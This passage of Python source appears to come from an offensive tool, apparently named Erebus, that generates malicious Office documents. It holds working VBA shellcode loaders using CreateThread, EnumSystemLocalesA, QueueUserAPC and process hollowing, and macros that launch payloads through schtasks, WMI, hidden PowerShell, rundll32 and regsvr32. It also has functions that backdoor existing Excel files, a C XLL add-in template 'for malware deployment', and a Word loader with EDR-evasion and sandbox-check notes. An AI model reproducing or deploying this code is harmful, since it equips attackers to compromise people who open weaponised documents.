            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)
            loader_type (str): Loader technique (createthread, enumlocales, queueuserapc, hollowing)
            target_process (str): Target process for hollowing technique (default: notepad.exe)

        Returns:
            str: VBA code with embedded shellcode injection
        """
        # Select appropriate loader
        if loader_type == "enumlocales":
            return self.generate_vba_loader_enumlocales(vba_shellcode, trigger_type)
        elif loader_type == "queueuserapc":
            return self.generate_vba_loader_queueuserapc(vba_shellcode, trigger_type)
        elif loader_type == "hollowing":
            return self.generate_vba_loader_process_hollowing(vba_shellcode, trigger_type, target_process)
        else:  # default to createthread
            return self.generate_vba_loader_createthread(vba_shellcode, trigger_type)

    def generate_vba_loader_createthread(self, vba_shellcode, trigger_type="AutoOpen"):
        """
        Classic VBA loader using VirtualAlloc + RtlMoveMemory + CreateThread.
        Most common and reliable technique for shellcode execution.

        Args:
            vba_shellcode (str): Shellcode array in VBA format
            trigger_type (str): Trigger function name

        Returns:
            str: VBA code with VirtualAlloc loader
        """
        # Apply intelligent chunking to handle large shellcode
        chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)

        vba_code = f'''
Option Explicit

' API Declarations for shellcode execution
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As LongPtr, _
    ByRef Source As Any, _
    ByVal Length As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal dwStackSize As LongPtr, _
    ByVal lpStartAddress As LongPtr, _
    ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, _
    ByRef lpThreadId As Long) As LongPtr

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle As LongPtr, _
    ByVal dwMilliseconds As Long) As Long

' Helper function to concatenate arrays
Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
    Dim combined() As Variant
    Dim i As Long, j As Long
    Dim size1 As Long, size2 As Long

    size1 = UBound(arr1) - LBound(arr1) + 1
    size2 = UBound(arr2) - LBound(arr2) + 1

    ReDim combined(0 To size1 + size2 - 1)

    For i = 0 To size1 - 1
        combined(i) = arr1(LBound(arr1) + i)
    Next i

    For j = 0 To size2 - 1
        combined(size1 + j) = arr2(LBound(arr2) + j)
    Next j

    ConcatenateArrays = combined
End Function

' XOR decryption routine
Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
    Dim decrypted() As Byte
    Dim i As Long
    Dim keyLen As Long

    keyLen = UBound(key) - LBound(key) + 1
    ReDim decrypted(LBound(encrypted) To UBound(encrypted))

    For i = LBound(encrypted) To UBound(encrypted)
        decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
    Next i

    XorDecrypt = decrypted
End Function

Sub {trigger_type}()
    On Error Resume Next
    Call ExecuteShellcode()
End Sub

Sub ExecuteShellcode()
    On Error Resume Next
    Dim shellcode As Variant
    Dim key As Variant
    Dim allocatedMemory As LongPtr
    Dim hThread As LongPtr
    Dim threadId As Long
    Dim shellcodeSize As Long
    Dim decrypted As Variant

    {chunked_shellcode}

    ' Decrypt shellcode using XOR
    decrypted = XorDecrypt(shellcode, key)

    ' Get shellcode size
    shellcodeSize = UBound(decrypted) - LBound(decrypted) + 1

    ' Allocate RWX memory
    allocatedMemory = VirtualAlloc(0, shellcodeSize, &H3000, &H40)

    If allocatedMemory = 0 Then
        Exit Sub
    End If

    ' Copy decrypted shellcode to allocated memory
    RtlMoveMemory allocatedMemory, decrypted(LBound(decrypted)), shellcodeSize

    ' Create thread to execute shellcode
    hThread = CreateThread(0, 0, allocatedMemory, 0, 0, threadId)

    If hThread = 0 Then
        Exit Sub
    End If

    ' Wait for thread to complete (optional - remove for async execution)
    WaitForSingleObject hThread, &HFFFFFFFF
End Sub
'''
        return vba_code

    def generate_vba_loader_enumlocales(self, vba_shellcode, trigger_type="AutoOpen"):
        """
        EnumSystemLocalesA callback technique for shellcode execution.
        Bypasses some static analysis by using API callbacks.

        Args:
            vba_shellcode (str): Shellcode array in VBA format
            trigger_type (str): Trigger function name

        Returns:
            str: VBA code with EnumSystemLocalesA callback loader
        """
        # Apply intelligent chunking to handle large shellcode
        chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)

        vba_code = f'''
Option Explicit

' API Declarations for callback-based execution
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As LongPtr, _
    ByRef Source As Any, _
    ByVal Length As Long) As LongPtr

Private Declare PtrSafe Function EnumSystemLocalesA Lib "kernel32" ( _
    ByVal lpLocaleEnumProc As LongPtr, _
    ByVal dwFlags As Long) As Long

' Helper function to concatenate arrays
Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
    Dim combined() As Variant
    Dim i As Long, j As Long
    Dim size1 As Long, size2 As Long

    size1 = UBound(arr1) - LBound(arr1) + 1
    size2 = UBound(arr2) - LBound(arr2) + 1

    ReDim combined(0 To size1 + size2 - 1)

    For i = 0 To size1 - 1
        combined(i) = arr1(LBound(arr1) + i)
    Next i

    For j = 0 To size2 - 1
        combined(size1 + j) = arr2(LBound(arr2) + j)
    Next j

    ConcatenateArrays = combined
End Function

' XOR decryption routine
Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
    Dim decrypted() As Byte
    Dim i As Long
    Dim keyLen As Long

    keyLen = UBound(key) - LBound(key) + 1
    ReDim decrypted(LBound(encrypted) To UBound(encrypted))

    For i = LBound(encrypted) To UBound(encrypted)
        decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
    Next i

    XorDecrypt = decrypted
End Function

Sub {trigger_type}()
    On Error Resume Next
    Call ExecuteViaCallback()
End Sub

Sub ExecuteViaCallback()
    On Error Resume Next
    Dim shellcode As Variant
    Dim key As Variant
    Dim allocatedMemory As LongPtr
    Dim shellcodeSize As Long
    Dim result As Long
    Dim decrypted As Variant

    {chunked_shellcode}

    ' Decrypt shellcode using XOR
    decrypted = XorDecrypt(shellcode, key)

    ' Get shellcode size
    shellcodeSize = UBound(decrypted) - LBound(decrypted) + 1

    ' Allocate RWX memory
    allocatedMemory = VirtualAlloc(0, shellcodeSize, &H3000, &H40)

    If allocatedMemory = 0 Then
        Exit Sub
    End If

    ' Copy decrypted shellcode to allocated memory
    RtlMoveMemory allocatedMemory, VarPtr(decrypted(LBound(decrypted))), shellcodeSize

    ' Execute shellcode via EnumSystemLocalesA callback
    result = EnumSystemLocalesA(allocatedMemory, 0)
End Sub
'''
        return vba_code

    def generate_vba_loader_queueuserapc(self, vba_shellcode, trigger_type="AutoOpen"):
        """
        QueueUserAPC injection technique for shellcode execution.
        Injects shellcode into current process via APC.

        Args:
            vba_shellcode (str): Shellcode array in VBA format
            trigger_type (str): Trigger function name

        Returns:
            str: VBA code with QueueUserAPC loader
        """
        # Apply intelligent chunking to handle large shellcode
        chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)

        vba_code = f'''
Option Explicit

' API Declarations for APC injection
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As LongPtr, _
    ByRef Source As Any, _
    ByVal Length As Long) As LongPtr

Private Declare PtrSafe Function GetCurrentThread Lib "kernel32" () As LongPtr

Private Declare PtrSafe Function QueueUserAPC Lib "kernel32" ( _
    ByVal pfnAPC As LongPtr, _
    ByVal hThread As LongPtr, _
    ByVal dwData As LongPtr) As Long

Private Declare PtrSafe Sub Sleep Lib "kernel32" ( _
    ByVal dwMilliseconds As Long)

' Helper function to concatenate arrays
Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
    Dim combined() As Variant
    Dim i As Long, j As Long
    Dim size1 As Long, size2 As Long

    size1 = UBound(arr1) - LBound(arr1) + 1
    size2 = UBound(arr2) - LBound(arr2) + 1

    ReDim combined(0 To size1 + size2 - 1)

    For i = 0 To size1 - 1
        combined(i) = arr1(LBound(arr1) + i)
    Next i

    For j = 0 To size2 - 1
        combined(size1 + j) = arr2(LBound(arr2) + j)
    Next j

    ConcatenateArrays = combined
End Function

' XOR decryption routine
Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
    Dim decrypted() As Byte
    Dim i As Long
    Dim keyLen As Long

    keyLen = UBound(key) - LBound(key) + 1
    ReDim decrypted(LBound(encrypted) To UBound(encrypted))

    For i = LBound(encrypted) To UBound(encrypted)
        decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
    Next i

    XorDecrypt = decrypted
End Function

Sub {trigger_type}()
    On Error Resume Next
    Call ExecuteViaAPC()
End Sub

Sub ExecuteViaAPC()
    On Error Resume Next
    Dim shellcode As Variant
    Dim key As Variant
    Dim allocatedMemory As LongPtr
    Dim hThread As LongPtr
    Dim shellcodeSize As Long
    Dim result As Long
    Dim decrypted As Variant

    {chunked_shellcode}

    ' Decrypt shellcode using XOR
    decrypted = XorDecrypt(shellcode, key)

    ' Get shellcode size
    shellcodeSize = UBound(decrypted) - LBound(decrypted) + 1

    ' Allocate RWX memory
    allocatedMemory = VirtualAlloc(0, shellcodeSize, &H3000, &H40)

    If allocatedMemory = 0 Then
        Exit Sub
    End If

    ' Copy decrypted shellcode to allocated memory
    RtlMoveMemory allocatedMemory, decrypted(LBound(decrypted)), shellcodeSize

    ' Get current thread handle
    hThread = GetCurrentThread()

    ' Queue APC to current thread
    result = QueueUserAPC(allocatedMemory, hThread, 0)

    ' Trigger APC execution with alertable wait
    Sleep 1
End Sub
'''
        return vba_code

    def generate_vba_loader_process_hollowing(self, vba_shellcode, trigger_type="AutoOpen", target_process="C:\\Windows\\System32\\notepad.exe"):
        """
        Process hollowing technique for shellcode execution.
        Creates suspended process and replaces its memory with shellcode.

        Args:
            vba_shellcode (str): Shellcode array in VBA format
            trigger_type (str): Trigger function name
            target_process (str): Target process to hollow (default: notepad.exe)

        Returns:
            str: VBA code with process hollowing loader
        """
        # Apply intelligent chunking to handle large shellcode
        chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)

        vba_code = f'''
Option Explicit

' API Declarations for process hollowing
Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As LongPtr
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
    ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    ByVal lpProcessAttributes As LongPtr, _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As LongPtr, _
    ByVal lpCurrentDirectory As String, _
    ByRef lpStartupInfo As STARTUPINFO, _
    ByRef lpProcessInformation As PROCESS_INFORMATION) As Long

Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpBaseAddress As LongPtr, _
    ByRef lpBuffer As Any, _
    ByVal nSize As LongPtr, _
    ByRef lpNumberOfBytesWritten As LongPtr) As Long

Private Declare PtrSafe Function ResumeThread Lib "kernel32" ( _
    ByVal hThread As LongPtr) As Long

Private Declare PtrSafe Function CloseHandle Lib "kernel32" ( _
    ByVal hObject As LongPtr) As Long

' Helper function to concatenate arrays
Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
    Dim combined() As Variant
    Dim i As Long, j As Long
    Dim size1 As Long, size2 As Long

    size1 = UBound(arr1) - LBound(arr1) + 1
    size2 = UBound(arr2) - LBound(arr2) + 1

    ReDim combined(0 To size1 + size2 - 1)

    For i = 0 To size1 - 1
        combined(i) = arr1(LBound(arr1) + i)
    Next i

    For j = 0 To size2 - 1
        combined(size1 + j) = arr2(LBound(arr2) + j)
    Next j

    ConcatenateArrays = combined
End Function

' XOR decryption routine
Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
    Dim decrypted() As Byte
    Dim i As Long
    Dim keyLen As Long

    keyLen = UBound(key) - LBound(key) + 1
    ReDim decrypted(LBound(encrypted) To UBound(encrypted))

    For i = LBound(encrypted) To UBound(encrypted)
        decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
    Next i

    XorDecrypt = decrypted
End Function

Sub {trigger_type}()
    On Error Resume Next
    Call ExecuteViaHollowing()
End Sub

Sub ExecuteViaHollowing()
    On Error Resume Next
    Dim shellcode As Variant
    Dim key As Variant
    Dim si As STARTUPINFO
    Dim pi As PROCESS_INFORMATION
    Dim allocatedMemory As LongPtr
    Dim shellcodeSize As Long
    Dim bytesWritten As LongPtr
    Dim result As Long
    Dim decrypted As Variant

    {chunked_shellcode}

    ' Decrypt shellcode using XOR
    decrypted = XorDecrypt(shellcode, key)

    ' Initialize STARTUPINFO
    si.cb = Len(si)

    ' Create suspended process
    result = CreateProcessA(vbNullString, "{target_process}", _
        0, 0, 0, &H4, 0, vbNullString, si, pi)

    If result = 0 Then
        Exit Sub
    End If

    ' Get shellcode size
    shellcodeSize = UBound(decrypted) - LBound(decrypted) + 1

    ' Allocate memory in target process
    allocatedMemory = VirtualAllocEx(pi.hProcess, 0, shellcodeSize, &H3000, &H40)

    If allocatedMemory = 0 Then
        CloseHandle pi.hProcess
        CloseHandle pi.hThread
        Exit Sub
    End If

    ' Write decrypted shellcode to target process
    result = WriteProcessMemory(pi.hProcess, allocatedMemory, _
        decrypted(LBound(decrypted)), shellcodeSize, bytesWritten)

    If result = 0 Then
        CloseHandle pi.hProcess
        CloseHandle pi.hThread
        Exit Sub
    End If

    ' Resume thread to execute shellcode
    ResumeThread pi.hThread

    ' Close handles
    CloseHandle pi.hProcess
    CloseHandle pi.hThread
End Sub
'''
        return vba_code

    def generate_schtasks_execution_vba(self, trigger_binary, trigger_command, task_name="SystemUpdate", trigger_type="AutoOpen"):
        """
        Generate VBA code that executes a payload via Windows Scheduled Tasks (schtasks).

        Uses schtasks.exe to create and execute a scheduled task, providing better stealth
        and persistence capabilities compared to direct WScript.Shell execution.

        Args:
            trigger_binary (str): Path to executable to run
            trigger_command (str): Command arguments to pass
            task_name (str): Name for the scheduled task
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)

        Returns:
            str: VBA code for scheduled task execution
        """
        vba_code = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim cmd As String
    Dim task_cmd As String

    Set shell = CreateObject("WScript.Shell")

    ' Create scheduled task to run the payload
    task_cmd = "schtasks /create /tn {task_name} /tr ""{trigger_binary} {trigger_command}"" /sc once /st 00:00:00"

    shell.Run task_cmd, 0, False

    ' Execute the task immediately
    Dim exec_cmd As String
    exec_cmd = "schtasks /run /tn {task_name}"
    shell.Run exec_cmd, 0, False

    ThisWorkbook.Close False
End Sub
"""
        return vba_code

    def generate_wmi_execution_vba(self, trigger_binary, trigger_command, trigger_type="AutoOpen"):
        """
        Generate VBA code that executes a payload via Windows Management Instrumentation (WMI).

        Uses WMI COM objects (Win32_Process) to execute commands, which can bypass some
        application whitelisting and provides better obfuscation.

        Args:
            trigger_binary (str): Path to executable to run
            trigger_command (str): Command arguments to pass
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)

        Returns:
            str: VBA code for WMI execution
        """
        vba_code = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim obj_locator As Object
    Dim obj_service As Object
    Dim obj_process As Object
    Dim cmd_line As String

    Set obj_locator = CreateObject("WbemScripting.SWbemLocator")

    Set obj_service = obj_locator.ConnectServer(".", "root\\\\cimv2")

    cmd_line = "{trigger_binary} {trigger_command}"

    Set obj_process = obj_service.Get("Win32_Process")
    obj_process.Create cmd_line

    ThisWorkbook.Close False
End Sub
"""
        return vba_code

    def generate_powershell_execution_vba(self, powershell_command, trigger_type="AutoOpen", encoded=False):
        """
        Generate VBA code that executes a payload via PowerShell.

        PowerShell execution is powerful for complex payloads and can bypass some restrictions.
        Supports both plain and base64-encoded commands.

        Args:
            powershell_command (str): PowerShell command to execute (or base64 if encoded=True)
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)
            encoded (bool): Whether the command is base64-encoded

        Returns:
            str: VBA code for PowerShell execution
        """
        ps_args = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
        if encoded:
            ps_args += " -EncodedCommand"

        vba_code = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim cmd As String

    Set shell = CreateObject("WScript.Shell")

    cmd = "powershell.exe {ps_args} {powershell_command}"

    shell.Run cmd, 0, False

    ThisWorkbook.Close False
End Sub
"""
        return vba_code

    def generate_rundll32_execution_vba(self, dll_path, entry_point="DllEntry", trigger_type="AutoOpen"):
        """
        Generate VBA code that executes a payload via rundll32.

        rundll32.exe can execute DLL exports and is a legitimate Windows tool that can
        bypass some application whitelisting policies.

        Args:
            dll_path (str): Path to DLL file to execute
            entry_point (str): Export function name to call (default: DllEntry)
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)

        Returns:
            str: VBA code for rundll32 execution
        """
        vba_code = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim cmd As String

    Set shell = CreateObject("WScript.Shell")

    cmd = "rundll32.exe ""{dll_path}"",{entry_point}"

    shell.Run cmd, 0, False

    ThisWorkbook.Close False
End Sub
"""
        return vba_code

    def generate_regsvr32_execution_vba(self, dll_path, trigger_type="AutoOpen"):
        """
        Generate VBA code that executes a payload via regsvr32 with a COM Scriptlet.

        regsvr32 is used to register COM objects and can execute scripts via .sct files.
        This is a known Living-off-the-Land technique for bypassing application whitelisting.

        Args:
            dll_path (str): Path to DLL or scriptlet (.sct) file
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)

        Returns:
            str: VBA code for regsvr32 execution
        """
        vba_code = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim cmd As String

    Set shell = CreateObject("WScript.Shell")

    cmd = "regsvr32.exe /s {dll_path}"

    shell.Run cmd, 0, False

    ThisWorkbook.Close False
End Sub
"""
        return vba_code

    def export_vba_as_text(self, vba_code, output_path=None):
        """
        Export VBA code as plain text file (.txt) that can be copied into Excel VBA editor.

        Args:
            vba_code (str): VBA source code
            output_path (Path or str): Output file path (optional)

        Returns:
            Path or str: Path to created file, or VBA code if no output path
        """
        if output_path:
            output_path = Path(output_path)
            output_path.write_text(vba_code, encoding='utf-8')
            return output_path
        else:
            return vba_code

    def export_vba_as_bas(self, vba_code, output_path=None, module_name="Payload"):
        """
        Export VBA code as .bas module file that can be imported into Excel.

        The .bas format is a standard VBA module file that Excel can directly import
        via File > Import File in the VBA editor.

        Args:
            vba_code (str): VBA source code
            output_path (Path or str): Output file path for .bas file
            module_name (str): Name of the VBA module

        Returns:
            Path: Path to created .bas file
        """
        if not output_path:
            raise ValueError("output_path is required for .bas export")

        output_path = Path(output_path)

        output_path.write_text(vba_code, encoding='utf-8')
        return output_path

    # Plugin function registrations
    def generate_excel_payload(self, payload_path, vba_payload, output_path=None, template_path=None):
        """
        Generate a malicious Excel document with embedded payload.

        Args:
            payload_path (str): Path to the VBA payload
            vba_payload (str): VBA code to embed
            output_path (str): Output file path (optional)
            template_path (Path): Optional path to template XLSX file. If None, creates from scratch.

        Returns:
            Path: Path to generated Excel file
        """
        if output_path is None:
            output_path = Path("malicious_document.xlsm")

        return self.create_new_excel_with_payload(output_path, vba_payload, template_path=template_path)

    def backdoor_existing_excel(self, source_excel, vba_payload, output_path=None):
        """
        Backdoor an existing Excel file with VBA payload.

        Args:
            source_excel (str): Path to source Excel file
            vba_payload (str): VBA code to inject
            output_path (str): Output file path (optional, defaults to _backdoored.xlsm)

        Returns:
            Path: Path to backdoored Excel file
        """
        if output_path is None:
            source_path = Path(source_excel)
            output_path = source_path.parent / f"{source_path.stem}_backdoored.xlsm"

        return self.backdoor_excel_document(source_excel, output_path, vba_payload)

    def generate_xll_template(self, shellcode_hex, encryption_type="XOR", injection_method="CreateThread", target_process="explorer.exe", guardrail_includes="", guardrail_code=""):
        """
        Generate a C/C++ XLL (Excel Add-In) DLL template for compilation.
        
        XLL files are DLLs with specific Excel add-in exports that auto-load in Excel.
        This provides a stealthy persistence/execution method.
        
        Args:
            shellcode_hex (str): Hexadecimal shellcode string
            encryption_type (str): Encryption method (XOR, RC4, etc.)
            injection_method (str): Injection technique (CreateThread, QueueUserAPC, etc.)
            target_process (str): Target process for injection
            guardrail_includes (str): Optional include block inserted before windows.h
            guardrail_code (str): Optional guardrail C/C++ code defining BOOL ErebusGuardrail(void)
            
        Returns:
            str: C/C++ source code for XLL DLL
        """
        
        # Convert hex string to C array format
        shellcode_bytes = bytes.fromhex(shellcode_hex.replace(' ', '').replace('\\x', ''))
        shellcode_array = ", ".join([f"0x{b:02x}" for b in shellcode_bytes])
        
        # Map encryption types to macro values
        encryption_map = {
            "NONE": 0,
            "XOR": 1,
            "RC4": 2,
            "AES_ECB": 3,
            "AES_CBC": 4
        }
        
        encryption_value = encryption_map.get(encryption_type.upper(), 1)
        
        guardrail_includes_block = guardrail_includes.strip()
        if guardrail_includes_block:
            guardrail_includes_block += "\n"

        if guardrail_code and guardrail_code.strip():
            guardrail_block = guardrail_code
        else:
            guardrail_block = """static BOOL ErebusGuardrail(void) {
    return TRUE;
}
"""

        xll_template = f'''/* 
 * Erebus XLL Payload - Auto-Loading Excel Add-In
 * Compiled with: Visual Studio (cl.exe) or MinGW-w64
 * Generated: Auto-generated XLL template for malware deployment
 */

{guardrail_includes_block}#include <windows.h>
#include <stdlib.h>
#include <string.h>

{guardrail_block}

/* ===== CONFIGURATION ===== */
#define SHELLCODE_SIZE {len(shellcode_bytes)}
#define ENCRYPTION_TYPE {encryption_value}
#define INJECTION_METHOD "{injection_method}"
#define TARGET_PROCESS L"{target_process}"

/* ===== SHELLCODE PAYLOAD ===== */
unsigned char shellcode[] = {{
    {shellcode_array}
}};

/* ===== XOR DECRYPTION ROUTINE ===== */
void xor_decrypt(unsigned char *data, size_t size, unsigned char *key, size_t key_size) {{
    for (size_t i = 0; i < size; i++) {{
        data[i] ^= key[i % key_size];
    }}
}}

/* ===== PROCESS INJECTION (CreateThread) ===== */
BOOL inject_createthread(unsigned char *payload, size_t payload_size) {{
    HANDLE hProc = NULL;
    LPVOID alloc = NULL;
    HANDLE hThread = NULL;
    
    /* Get target process */
    DWORD dwPID = GetCurrentProcessId();  /* Use current process for testing */
    
    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProc) return FALSE;
    
    /* Allocate memory */
    alloc = VirtualAllocEx(hProc, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!alloc) {{
        CloseHandle(hProc);
        return FALSE;
    }}
    
    /* Write shellcode */
    if (!WriteProcessMemory(hProc, alloc, payload, payload_size, NULL)) {{
        VirtualFreeEx(hProc, alloc, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }}
    
    /* Execute */
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
    if (!hThread) {{
        VirtualFreeEx(hProc, alloc, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }}
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}}

/* ===== INJECTION DISPATCHER ===== */
BOOL execute_payload(unsigned char *payload, size_t payload_size) {{
    #ifdef INJECTION_METHOD
    if (strcmp(INJECTION_METHOD, "CreateThread") == 0) {{
        return inject_createthread(payload, payload_size);
    }}
    #endif
    
    /* Default to in-process execution */
    typedef void (*SHELLCODE_FUNC)(void);
    SHELLCODE_FUNC func = (SHELLCODE_FUNC)payload;
    func();
    return TRUE;
}}

/* ===== EXCEL ADD-IN EXPORTS ===== */

/* xlAddInManagerInfo - Called when Excel loads the add-in */
__declspec(dllexport) void __cdecl xlAddInManagerInfo(LPXLOPER pxDll) {{
    static XLOPER xDll;
    xDll.xltype = xltypeStr;
    xDll.val.str = "\\x09Erebus XLL Payload";
    *pxDll = xDll;
}}

/* xlAutoOpen - Auto-executed when Excel opens the add-in */
__declspec(dllexport) int __cdecl xlAutoOpen(void) {{
    if (!ErebusGuardrail()) {{
        return 1;  /* Success */
    }}

    unsigned char payload_copy[SHELLCODE_SIZE];
    
    /* Copy shellcode to avoid modifying original */
    memcpy(payload_copy, shellcode, SHELLCODE_SIZE);
    
    /* Decrypt if needed */
    #if ENCRYPTION_TYPE == 1
    /* XOR decryption - use hardcoded key for POC */
    unsigned char xor_key[] = {{0x41, 0x41, 0x41, 0x41}};
    xor_decrypt(payload_copy, SHELLCODE_SIZE, xor_key, sizeof(xor_key));
    #endif
    
    /* Execute payload */
    execute_payload(payload_copy, SHELLCODE_SIZE);
    
    return 1;  /* Success */
}}

/* xlAutoClose - Called when Excel closes the add-in */
__declspec(dllexport) int __cdecl xlAutoClose(void) {{
    return 1;  /* Success */
}}

/* xlAutoRegister - Called for function registration (minimal implementation) */
__declspec(dllexport) LPXLOPER __cdecl xlAutoRegister(LPXLOPER pxName) {{
    static XLOPER xRegister;
    xRegister.xltype = xltypeBool;
    xRegister.val.booleen = 1;
    return &xRegister;
}}

/* DLL Entry Point */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {{
    switch (fdwReason) {{
        case DLL_PROCESS_ATTACH:
            /* Initialize */
            break;
        case DLL_PROCESS_DETACH:
            /* Cleanup */
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        default:
            break;
    }}
    return TRUE;
}}
'''
        return xll_template

    def register_xll_function(self, function_name, function_macro):
        """
        Create a function registration helper for XLL.
        XLL functions must be registered to appear in Excel's function wizard.
        
        Args:
            function_name (str): Name of function (e.g., "ExecutePayload")
            function_macro (str): Macro/function signature
            
        Returns:
            str: C code for function registration
        """
        
        registration_code = f'''/* Function: {function_name} */
__declspec(dllexport) LPXLOPER __cdecl {function_name}(void) {{
    static XLOPER xResult;
    xResult.xltype = xltypeNum;
    xResult.val.num = 0;
    return &xResult;
}}
'''
        return registration_code


    # ------------------------------------------------------------------
    # Word Document (.docm / .doc) methods
    # ------------------------------------------------------------------

    def _wrap_with_document_open(self, vba_code: str) -> str:
        """Prepend a Document_Open() stub that calls the same entry as AutoOpen().

        Existing Excel loaders only emit AutoOpen; Word also fires Document_Open
        on explicit open (e.g. double-click from Explorer). Both fire on Open so
        keeping both maximises coverage.
        """
        import re
        m = re.search(r'Sub\s+(AutoOpen)\s*\(\)', vba_code)
        if not m:
            return vba_code
        entry = m.group(1)
        stub = f"\nSub Document_Open()\n    Call {entry}()\nEnd Sub\n"
        return stub + vba_code

    def _generate_word_loader_createthread_rwrx(self, vba_shellcode: str) -> str:
        """Improved Word createthread loader.

        Improvements over the PEN-300 baseline (Listing 50):
        - Allocate PAGE_READWRITE (0x04) only; flip to PAGE_EXECUTE_READ (0x20)
          via VirtualProtect after copy.  Avoids persistent RWX allocation which
          is the primary EDR allocation heuristic.
        - Zero source buffer (buf array) immediately after copy to reduce
          forensic artefacts on the Word process heap.
        - GetTickCount sandbox gate: abort if system uptime < 5 min.
        - WaitForSingleObject + CloseHandle for proper thread lifecycle.
        - Both Document_Open and AutoOpen triggers for Word coverage.
        """
        chunked_shellcode = self.chunk_shellcode_array(vba_shellcode, max_line_length=200)

        return f'''
Option Explicit

' --- Win32 API declarations ---

' Allocate RW region first — never RWX on initial alloc
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress        As LongPtr, _
    ByVal dwSize           As Long,    _
    ByVal flAllocationType As Long,    _
    ByVal flProtect        As Long)    As LongPtr

' Flip RW -> RX after shellcode copy (PAGE_EXECUTE_READ = 0x20)
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" ( _
    ByVal lpAddress    As LongPtr, _
    ByVal dwSize       As Long,    _
    ByVal flNewProtect As Long,    _
    ByRef lpOldProtect As Long)    As Long

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
    ByVal lDst  As LongPtr, _
    ByRef sSrc  As Any,     _
    ByVal lLen  As Long)    As LongPtr

Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal SecAttr     As Long,    _
    ByVal StackSize   As Long,    _
    ByVal StartFunc   As LongPtr, _
    ByVal ThreadParam As LongPtr, _
    ByVal CreateFlags As Long,    _
    ByRef ThreadId    As Long)    As LongPtr

